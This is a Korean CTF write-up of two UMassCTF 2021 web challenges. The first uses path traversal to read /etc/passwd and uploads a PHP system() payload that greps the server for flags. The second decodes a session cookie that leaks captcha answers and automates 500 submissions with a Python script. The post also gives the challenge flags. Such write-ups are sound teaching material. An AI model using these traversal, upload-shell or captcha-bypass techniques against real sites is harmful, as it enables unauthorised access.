---
layout: post
title:  "UMassCTF 2021 Writeup"
tags: [CTF]
excerpt: "UMassCTF 2021 Writeup"
---

## Hermit - Part1

```
+ Description
  + Help henry find a new shell

+ Link
  + http://104.197.195.221:8086
  + http://34.121.84.161:8086

+ Created by
  + Cobchise#6969
```

+ #### 문제 분석 & 문제 풀이

    ![Hermit part1](/post-images/UMassCTF/2021/WEB/Hermit-Part1/Hermit.png)

    링크에 들어가면은 사진과 이미지를 업로드할 수 있는 기능이 있습니다.

    아무런 이미지로 파일 선택을 한 다음 ``UPLOAD IMAGE`` 누르면

    ![Hermit Upload](/post-images/UMassCTF/2021/WEB/Hermit-Part1/Hermit-Upload.png)

    이런식으로 ``dbg.png`` 파일 이름과 ``/var/www/html/uploads/1uKVHV`` 해당 이미지가 업로드 된 다음 저장된 경로와 함께

    ``See Image``라는 링크가 있습니다.
  
  해당 링크를 눌러보면

  ``/show.php?filename=V9U4vo`` 으로 이동하게 되면서

  ![Image read](/post-images/UMassCTF/2021/WEB/Hermit-Part1/Image-read.png)

  상단에 이미지를 읽은 텍스트와

  ![Image Viewer](/post-images/UMassCTF/2021/WEB/Hermit-Part1/Image-View.png)

  하단에 업로드했던 이미지가 나오게됩니다.

  처음에는 ``/show.php?filename=V9U4vo`` 이동한 URL에 ``?filename``으로 파라미터를 받는것을 보고

  ``/show.php?filename=../../../../../../etc/passwd`` 이런식으로 내부 서버에 있는 파일에 접근했더니

  ```html
  <img src="data:image/png;base64,cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTAxOjEwMjpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDoxMDI6MTAzOnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50LCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXJlc29sdmU6eDoxMDM6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDoxMDQ6MTA2Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3NoZDp4OjEwNTo2NTUzNDo6L3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCmhlcm1pdDp4OjEwMDA6MTAwMDo6L2hvbWUvaGVybWl0Oi9iaW4vc2gK">
  ```

  Data URIs 형식으로 base64 인코딩된 값이 있는것을 볼 수 있습니다.

  해당 인코딩된 값을 디코딩하면

  ```py
  >>> dec = """cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTAxOjEwMjpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDoxMDI6MTAzOnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50LCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXJlc29sdmU6eDoxMDM6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDoxMDQ6MTA2Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3NoZDp4OjEwNTo2NTUzNDo6L3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCmhlcm1pdDp4OjEwMDA6MTAwMDo6L2hvbWUvaGVybWl0Oi9iaW4vc2gK"""
  >>> print(__import__("base64").b64decode(dec).decode())
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
  systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
  systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
  systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
  messagebus:x:104:106::/nonexistent:/usr/sbin/nologin
  sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
  hermit:x:1000:1000::/home/hermit:/bin/sh

  >>>
  ```

  이런식으로 ``/etc/passwd``의 정보가 나오게됩니다.

  하지만 해당 취약점을 이용해 내부의 서버에 접근한다 해도 FLAG가 들어있는 파일의 위치를 모르기때문에 다른 방법을 찾아보면

  어떠한 이미지를 업로드할때

  ![Image read](/post-images/UMassCTF/2021/WEB/Hermit-Part1/Image-read.png)

  이런식으로 해당 이미지를 읽으면서 출력을 하게 되는데
  해당 방법으로 PHP 소스 파일을 넣으면 어떨까 하고

  ``test.php`` 파일에

  ```php
  <?php
    system("find /* -name '*.*' 2>/dev/null | xargs grep 'UMASS{' 2>/dev/null");
  ?>
  ```

  UMassCTF의 FLAG형식으로 find명령어를 이용하면

  ![Print FLAG](/post-images/UMassCTF/2021/WEB/Hermit-Part1/Get-Flag.png)

  명령어가 실행되는동안 로딩이 걸리면서 플래그가 나오게됩니다.

  ```
  /home/hermit/flag/userflag.txt:UMASS{a_picture_paints_a_thousand_shells} /tmp/tek.gz:UMASS{a_test_of_integrity}
  ```

``Flag is UMASS{a_picture_paints_a_thousand_shells}``

``Flag is UMASS{a_test_of_integrity}``

## PikCha

```
+ Link
  + http://104.197.195.221:8084
  + http://34.121.84.161:8084

+ Created By 
  + Soul#8230
```

+ #### 문제 분석 & 문제 풀이

  ![PikCha](/post-images/UMassCTF/2021/WEB/PikCha/PikCha.png)

  링크에 들어가면 4개의 포켓몬 사진과 입력할 수 있는 공간이 생기게 됩니다.

  해당 사이트를 조금 더 분석해보면

  쿠키에 ``session`` 으로 

  ```
  eyJhbnN3ZXIiOlsxMTYsNzcsNjUsNTddLCJjb3JyZWN0IjowLCJpbWFnZSI6Ii4vc3RhdGljL2NoYWxsLWltYWdlcy91UHlTRERscWVtLmpwZyJ9.YHL7PA.colwzyoT-2qA8GDg7Czv78z03tw
  ``` 
  
  이런 쿠키값이 있는것을 알 수 있습니다.

  해당 쿠키의 값을 base64 디코딩 해보면

  ![base64 decode](/post-images/UMassCTF/2021/WEB/PikCha/base64decode.png)

  ``{"answer":[116,77,65,57],"correct":0,"image":"./static/chall-images/uPySDDlqem.jpg"}`` 
  
  이러한 값이 나오게됩니다.

  값에 있는 answer 부분의 ``[116,77,65,57]``는 포켓몬스터의 일렬번호라는것을 알게 되었습니다.

  ```
  116번은 쏘드라
  77번은 포니타
  65번은 후딘
  57 성원숭
  ```
  
  그림과 일치한것을 볼 수 있는데

  아까 봤던 페이지의 입력하는 부분에

  ``116 77 65 57`` 이런식으로 입력하면 ``0/500`` 에서 ``1/500`` 으로 늘어나는것을 볼 수 있습니다.

  ![Point](/post-images/UMassCTF/2021/WEB/PikCha/PikCha1.png)

  해당 규칙을 이용하여 

  ```py
  import requests
  import base64
  import json

  url = 'http://34.121.84.161:8084/'

  session = requests.Session()

  for i in range(1, 501):

  	get = session.get(url)
  	encoded_jwt = session.cookies['session']
  	header = json.loads(base64.b64decode(encoded_jwt.split(".")[0]+"==").decode())
  	post = session.post(url, data={"guess": ' '.join(map(str, header['answer']))})
  	print("\r" + str(header['correct']), end='')

  	if i == 500:
  		print(get.text)
  		print(post.text)

  session.close()
  ```

  python으로 자동화 스크립트를 짜면

  ```html
  499<!doctype html>
  <title>UMassCTF '21 - PikaCha</title>
  <link rel="stylesheet" href="/static/style.css">
  <nav>


  </nav>
  <section class="content center">
    <header>

    </header>

    <h1 class="text">PikCha</h1>
    <img src="./static/chall-images/cclMjDmMYu.jpg" />
    <p>
      499 / 500
    </p>
    <form method='post' action='/'>
      <input type="text" id="guess" name="guess">
      <input type="submit" value="Submit">
    </form>
  </section>
  UMASS{G0tt4_c4tch_th3m_4ll_17263548}
  500<!doctype html>
  <title>UMassCTF '21 - PikaCha</title>
  <link rel="stylesheet" href="/static/style.css">
  <nav>


  </nav>
  <section class="content center">
    <header>

    </header>

    <h1 class="text">PikCha</h1>
    <img src="./static/chall-images/SryqxaELSv.jpg" />
    <p>
      500 / 500
    </p>
    <form method='post' action='/'>
      <input type="text" id="guess" name="guess">
      <input type="submit" value="Submit">
    </form>
  </section>
  ```
  
  ``500/500``이 될때 FLAG가 나오게됩니다.

``Flag is UMASS{G0tt4_c4tch_th3m_4ll_17263548}``

## 후기

CTF하면서 포켓몬스터에 대해 공부할줄은 몰랐다..